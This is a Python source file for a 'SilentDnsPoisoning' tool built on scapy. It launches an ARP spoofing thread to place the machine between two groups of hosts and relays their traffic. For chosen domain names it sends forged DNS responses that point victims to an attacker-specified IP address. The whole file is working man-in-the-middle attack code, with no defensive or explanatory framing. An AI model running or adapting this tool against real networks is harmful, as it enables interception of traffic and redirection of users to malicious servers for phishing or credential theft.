import sys
import time
import threading
from scapy.all import *
from ArpSpoofing import ArpSpoofing

class SilentDnsPoisoning:
    interface = 0
    def __init__(self, intFace):
        self.interface = intFace

    def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison, timeSleep, stop_event):

        def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison, interface):
            if pkt.haslayer(IP) and pkt.haslayer(Ether):
                # if source is target 1 then someone from target 2 must be the true receiver
                if pkt[Ether].src in target1MAC:
                    found = False
                    # find true receiver (the mac of true receiver)
                    receiver = pkt[IP].dst
                    oldEtherSource = pkt[Ether].src
                    for i in range(len(target2)):
                        if receiver == target2[i]:
                            # we are the source now cause target 2 thinks we are target 1
                            pkt[Ether].src = pkt[Ether].dst
                            # set the mac of the true receiver (someone from list target2)
                            pkt[Ether].dst = target2MAC[i]
                            found = True
                            break
                    # send the packet
                    if found:
                        if pkt.haslayer(DNS):
                            if pkt[DNS].qr == 0:
                                linkPresent = False
                                for link in url:
                                    # if we find a matching link do not resend the packet to its true receiver
                                    # but make a fake response query
                                    if link in pkt[DNS].qd.qname:
                                        print("{} wants to connect to {} .".format(pkt[IP].src, link))
                                        linkPresent = True
                                        fakeEther = Ether(src=pkt[Ether].src, dst=oldEtherSource)
                                        # for a response revert destination and source
                                        fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                                        fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                        # fake query pointing the requested URL to the poison IP
                                        fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
                                        # fake DNS response
                                        fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
                                        # combine into complete packet
                                        poisonPacket = fakeEther / fakeIP / fakeUDP / fakeDNS
                                        # send the poison packet to the victim
                                        sendp(poisonPacket, verbose=0, iface=interface)
                                        print("Fake DNS response sent to {} .".format(poisonPacket[IP].dst))
                                        break
                                if linkPresent == False:
                                    print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                                    # No link match -> resend the DNS request to its true receiver
                                    sendp(pkt, iface=interface)
                            else:
                                print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                                # This is not a DNS request -> resend the packet to its true receiver
                                sendp(pkt, iface=interface)
                        else:
                            print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                            # Packet doesn't have DNS layer -> resend the packet to its true receiver
                            sendp(pkt, iface=interface)
                # same but with source target 2
                elif pkt[Ether].src in target2MAC:
                    found = False
                    receiver = pkt[IP].dst
                    for i in range(len(target1)):
                        if receiver == target1[i]:
                            print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                            pkt[Ether].src = pkt[Ether].dst
                            pkt[Ether].dst = target1MAC[i]
                            found = True
                            break
                    if found:
                        sendp(pkt, iface=interface)

        arpSpoofing = ArpSpoofing(self.interface)
        stop_event2 = threading.Event()
        try:
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof,
                                        args=(target1, target2, target1MAC, target2MAC, False, False, timeSleep, stop_event2))
            arpSpoof.daemon = True
            arpSpoof.start()
        except:
            print("Thread 'arp poisoning' failed to start.")

        while not stop_event.is_set():
            sniff(count=1, store=0,
                  prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison,
                                                 self.interface), iface=self.interface)
        print("DNS poisoning is stopped.")
        print("Stopping the ARP poisoning")
        stop_event2.set()
        arpSpoof.join()